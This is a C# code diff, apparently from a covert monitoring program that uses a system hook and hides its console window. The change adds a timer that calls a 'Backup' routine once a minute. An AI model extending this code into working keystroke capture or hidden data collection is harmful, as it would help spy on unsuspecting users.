@@ -4,6 +4,9 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.Collections.Generic;
 using System;
+using System.Threading;
+using sys.app.backup;
+using Timer = System.Threading.Timer;
 
 namespace system.app
 {
@@ -15,11 +18,17 @@ namespace system.app
         private static IntPtr _hookID = IntPtr.Zero;
         private static DateTime LastFlushTime = DateTime.Now;
         private static string AppPath = Application.StartupPath;
+        
+        private static readonly TimeSpan TimerPeriod = new TimeSpan(0, 0, 1, 0);
+        private static readonly TimeSpan TimerDelay = new TimeSpan(0, 0, 0, 10);
+        private static readonly AutoResetEvent AutoEvent = new AutoResetEvent(false);
+        
+        private static readonly Timer BackupTimer = new Timer(Manager.Backup, AutoEvent, TimerDelay, TimerPeriod);
 
         static void Main(string[] args)
         {
             try
-            {
+            {                
                 var handle = GetConsoleWindow();
 
                 // Hide
